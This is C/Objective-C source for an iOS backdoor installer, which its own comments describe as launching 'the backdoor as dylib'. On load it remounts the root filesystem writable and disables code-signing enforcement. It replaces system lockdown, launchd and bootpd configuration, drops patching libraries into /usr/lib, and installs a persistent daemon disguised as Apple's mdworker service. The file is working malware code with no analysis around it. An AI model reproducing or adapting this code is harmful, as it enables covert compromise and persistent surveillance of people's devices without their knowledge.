/*
  $CC -arch armv7 -x objective-c \
  -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk \
  -F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/System/Library/Frameworks \
  -I/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/usr/include \
  -I. -I/usr/local/include -framework Foundation -DNODYLIB  dmisinstall.c -o dm
 *
  $CC -arch armv7 -x objective-c \
  -isysroot /Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk \
  -F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/System/Library/Frameworks \
  -I/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS4.2.sdk/usr/include \
  -I. -I/usr/local/include -framework Foundation -dynamiclib -init __dlinit dmisinstall.c -o dml
 *
 */

#include <stdio.h>
#include <unistd.h>
#include <errno.h>
 #include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/time.h>
#include <sys/stat.h>
#include <pthread.h>
#include <Foundation/Foundation.h>

#define KJB_HOME "/var/mobile/id"

#define LCKD_SERVICES_STR   "/System/Library/Lockdown/Services.plist"
#define LCKD_SERVICES 		  @"/System/Library/Lockdown/Services.plist"
#define KJB_LCKD_SERVICES 	@"/var/mobile/Media/kdi/Services.plist"
#define SAVED_LCKD_SERVICES @"/System/Library/Lockdown/Services.bck"

#define LAUNCHDCONF			    @"/etc/launchd.conf"
#define KJB_LAUNCHDCONF		  @"/var/mobile/Media/kdi/launchd.conf"

#define KJB_AMFI_PLIST 	    @"/var/mobile/Media/kdi/com.apple.MobileFileIntegrity.plist"
#define AMFI_PLIST 			    @"/System/Library/LaunchDaemons/com.apple.MobileFileIntegrity.plist"

#define BOOTD_PLIST_STR      "/System/Library/LaunchDaemons/com.apple.bootpd.plist"
#define BOOTD_PLIST			    @"/System/Library/LaunchDaemons/com.apple.bootpd.plist"
#define KJB_BOOTD_PLIST		  @"/var/mobile/Media/kdi/com.apple.bootpd.plist"

#define KJB_KPF_DYLIB       @"/var/mobile/Media/kdi/kpf.dylib"
#define KPF_DYLIB           @"/usr/lib/kpf.dylib"
#define KJB_KPB_DYLIB       @"/var/mobile/Media/kdi/kpb.dylib"
#define KPB_DYLIB           @"/usr/lib/kpb.dylib"

#define KJB_AMFI_DYLIB		  @"/var/mobile/Media/kdi/dmis.dylib"
#define AMFI_DYLIB			    @"/usr/lib/dmis.dylib"

#define IOS_PLIST           "/Library/LaunchDaemons/com.apple.mdworker.plist"

//#define ___DEBUG_

char *plist =
"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
"<plist version=\"1.0\">\n"
"<dict>\n"
"<key>Label</key>\n"
"<string>com.apple.mdworker</string>\n"
"<key>KeepAlive</key>\n"
"<true/>\n"
"<key>ThrottleInterval</key>\n"
"<integer>3</integer>\n"
"<key>ProgramArguments</key>\n"
"<array>\n"
"<string>%s</string>\n"
"</array>\n"
"<key>WorkingDirectory</key>\n"
"<string>/var/mobile/%s</string>\n"
"<key>RunAtLoad</key>\n"
"<true/>\n"
"</dict>\n"
"</plist>";

struct hfs_mount_args {
        char    *fspec;                 /* block special device to mount */
        uid_t   hfs_uid;                /* uid that owns hfs files (standard HFS only) */
        gid_t   hfs_gid;                /* gid that owns hfs files (standard HFS only) */
        mode_t  hfs_mask;               /* mask to be applied for hfs perms  (standard HFS only) */
        u_int32_t hfs_encoding;			/* encoding for this volume (standard HFS only) */
        struct  timezone hfs_timezone;  /* user time zone info (standard HFS only) */
        int             flags;          /* mounting flags, see below */
        int     journal_tbuffer_size;   /* size in bytes of the journal transaction buffer */
        int             journal_flags;          /* flags to pass to journal_open/create */
        int             journal_disable;        /* don't use journaling (potentially dangerous) */
};

#define	MNT_UPDATE	0x00010000
#define	MNT_ROOTFS	0x00004000

char __attribute__ ((visibility ("hidden"))) **list_dir_content(char *dir_name)
{
  DIR * d;
  int i = 0;
  static char *dirlist[256];
  struct stat dirstat;
  
  dirlist[0] = NULL;
  
  if (stat(dir_name, &dirstat) == -1)
    return dirlist;
  
  d = opendir (dir_name);
  
  if (! d)
    return dirlist;
  
  while (1)
  {
    struct dirent * entry;
    
    entry = readdir(d);
    
    if (!entry)
      break;
    
    if (i < 256 && (strcmp(entry->d_name, "..") && strcmp(entry->d_name, ".") && strcmp(entry->d_name, "(null)")))
    {
#ifdef WIN32
      char *path = (char*)malloc(256);
#else
      char *path = (char*)malloc(entry->d_namlen+1);
#endif
      
      sprintf(path, "%s", entry->d_name);
      
      dirlist[i++] = path;
    }
    
    if (i >= 256)
    {
      i = 255;
      break;
    }
  }
  
  dirlist[i] = NULL;
  
  closedir(d);
  
  return dirlist;
}

void __attribute__ ((visibility ("hidden"))) write_file(char *filename, char *buffer, int filelen)
{
  int len = 0;
  int fd = open(filename, O_WRONLY|O_CREAT);
  char *ptr = buffer;
  
  while(len < filelen)
  {
    int rb = write(fd, ptr, filelen);
    len += rb;
    ptr += rb;
    filelen -= rb;
  }
}

char __attribute__ ((visibility ("hidden"))) *open_file(char *filename, int *size)
{
    struct stat info;
    int filelen, len = 0;

    int fd = open(filename, O_RDONLY);

    if(fstat(fd, &info) == -1)
    {
      return NULL;
    }

    filelen = info.st_size;

    char *buffer = (char*)malloc(filelen);
    char *ptr = buffer;
    
    memset(buffer, 0, filelen);

    while(len < filelen)
    {
        int rb = read(fd, ptr, filelen);
        len += rb;
        ptr += rb;
    }

    close(fd);

    *size = filelen;
    buffer[filelen] = 0;

    return buffer;
}

void __attribute__ ((visibility ("hidden"))) install()
{
  char src[256];
  char dst[256];
  int len = 0, i = 0;
  char corepath[256];
  char iosplist[2048];
  
  memset(iosplist, 0, 2048);

  char *dir  = open_file("/var/mobile/Media/kdi/fdir", &len);
  char *core = open_file("/var/mobile/Media/kdi/fcore", &len);

  NSLog(@"%s: running...", __func__);

  mkdir(dir, 0777);
  
  char **dircont = list_dir_content("/var/mobile/Media/ios");

#ifdef ___DEBUG_
  NSLog(@"%s: dest folder is %s [%d ]core is %s.", __func__, dir, len, core);
#endif

  while(dircont[i] != NULL)
  {
    memset(src, 0, 256);
    memset(dst, 0, 256);

    len = 0;

    sprintf(src, "/var/mobile/Media/ios/%s", dircont[i]);
    sprintf(dst, "%s/%s", dir, dircont[i]);

    char *buff = open_file(src, &len);

#ifdef ___DEBUG_    
    NSLog(@"%s: install file %s [%d].", __func__, dst, len);
#endif

    if (buff != NULL)
      write_file(dst, buff, len);

#ifdef ___DEBUG_
    NSLog(@"%s: done.", __func__);
#endif

    i++;
  }

  sprintf(corepath, "%s/%s", dir, core);

  chmod(corepath, 0755);

  sprintf(iosplist, plist, corepath, dir);

#ifdef ___DEBUG_
  NSLog(@"%s: installing ios plist %s.", __func__, IOS_PLIST);
#endif

  write_file(IOS_PLIST, iosplist, strlen(iosplist));

#ifdef ___DEBUG_
  NSLog(@"%s: done.", __func__);
#endif
}

void __attribute__ ((visibility ("hidden"))) *disableSecurity(void *arg)
{
#ifdef ___DEBUG_  
  NSLog(@"%s: Disabling security features...", __func__);
#endif

  dlopen("/usr/lib/kpf.dylib", 2);

#ifdef ___DEBUG_
  NSLog(@"%s: done.", __func__);
#endif
}

void __attribute__ ((visibility ("default"))) _dlinit()
{
	struct hfs_mount_args args;
   	args.fspec = "/dev/disk0s1";
   	
   	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

#ifdef ___DEBUG_
   	NSLog(@"%s: trying remount roofs rw", __func__);
#endif

   	int ret = mount("hfs", "/", MNT_ROOTFS | MNT_UPDATE, &args);

   	if (ret != 0)
   	{
#ifdef ___DEBUG_      
   		NSLog(@"%s: cannot remount rootfs with rw flags. [%d]", __func__, errno);
#endif

   		exit(-1);
   	}
   	
#ifdef ___DEBUG_    
	NSLog(@"%s: done.", __func__);
#endif

    int new = 0;

    int rets = sysctlbyname("security.mac.proc_enforce", NULL, NULL, new, sizeof(new));

#ifdef ___DEBUG_
    if (rets == 0)
      NSLog(@"%s; proc_enforce disabled", __func__);
#endif

    rets = sysctlbyname("security.mac.vnode_enforce", NULL, NULL, new, sizeof(new));

#ifdef ___DEBUG_
    if (rets == 0)
      NSLog(@"%s; vnode_enforce disabled", __func__);
#endif

    NSError *err;

   	NSFileManager *fm = [NSFileManager defaultManager];

#ifdef ___DEBUG_
	 NSLog(@"%s: trying copy launchd conf", __func__);
#endif

    [fm removeItemAtPath:LAUNCHDCONF error: &err];
      
   	if ([fm copyItemAtPath:KJB_LAUNCHDCONF toPath:LAUNCHDCONF error:&err] == NO)
   	{
#ifdef ___DEBUG_      
   		NSLog(@"%s: cannot install launchd config.[%@]", __func__, err);
#endif
   		exit(-2);
   	}

#ifdef ___DEBUG_	
	NSLog(@"%s: done.", __func__);
#endif

	// Services.plist add service:
   	//  com.apple.kafc: afcd user:root  path:"/"
   	//  com.apple.stop.amfid:  launchctl unload com.apple.mobileFileIntegrity.plist
   	//  com.apple.start.amfid: launchctl load   com.apple.mobileFileIntegrity.plist
   	//  com.apple.bootpd0:	   launchctl load   com.apple.bootpd0.plist
#ifdef ___DEBUG_	
	NSLog(@"%s: trying copy lockdownd services", __func__);
#endif

    [fm copyItemAtPath:LCKD_SERVICES toPath:SAVED_LCKD_SERVICES error:&err];

    [fm removeItemAtPath:LCKD_SERVICES error: &err];
  
   	if ([fm copyItemAtPath:KJB_LCKD_SERVICES toPath:LCKD_SERVICES error:&err] == NO)
   	{
#ifdef ___DEBUG_
   		NSLog(@"%s: cannot install lockdown services.[%@]", __func__, err);
#endif
   		exit(-3);
   	}
	
  chown(LCKD_SERVICES_STR, 0, 0);

#ifdef ___DEBUG_
  NSLog(@"%s: trying install core elements", __func__);
#endif

  install();

#ifdef ___DEBUG_
  NSLog(@"%s: trying copy bootpd plist", __func__);
#endif

   	// com.apple.bootpd0.plist: launch the backdoor as dylib    
    [fm removeItemAtPath:BOOTD_PLIST error: &err];
   	
    if ([fm copyItemAtPath:KJB_BOOTD_PLIST toPath:BOOTD_PLIST error:&err] == NO)
   	{
#ifdef ___DEBUG_      
   		NSLog(@"%s: cannot install lockdown services. [%@]", __func__, err);
#endif
   		exit(-5);
   	}
    
    chown(BOOTD_PLIST_STR, 0, 0);

	// dylib for patching kpf
#ifdef ___DEBUG_    
    NSLog(@"%s: trying copy patching Libraries", __func__);
#endif

    [fm removeItemAtPath:KPF_DYLIB error: &err];

   	if ([fm copyItemAtPath:KJB_KPF_DYLIB toPath:KPF_DYLIB error:&err] == NO)
   	{
#ifdef ___DEBUG_      
   		NSLog(@"%s: cannot install kpf dylib. [%@]", __func__, err);
#endif
   		exit(-6);
   	}
	
  [fm removeItemAtPath:KPB_DYLIB error: &err];

    if ([fm copyItemAtPath:KJB_KPB_DYLIB toPath:KPB_DYLIB error:&err] == NO)
    {
#ifdef ___DEBUG_
      NSLog(@"%s: cannot install kpf dylib. [%@]", __func__, err);
#endif
      exit(-7);
    }

#ifdef ___DEBUG_    
	NSLog(@"%s: done.", __func__);
#endif

	[pool release];

  pthread_t thd;

  pthread_create(&thd, NULL, disableSecurity, NULL);

  sleep(5);

  write_file("/var/mobile/Media/kdi/c1", "c1", 2);

  chown("/var/mobile/Media/kdi/c1", 501, 501);
  chmod("/var/mobile/Media/kdi/c1", 0644);
  
  NSLog(@"%s: all done.", __func__);

  exit(0x1000);
}

#ifdef NODDYLIBMOD

int main()
{
	_dlinit();
	return 0;
}

#endif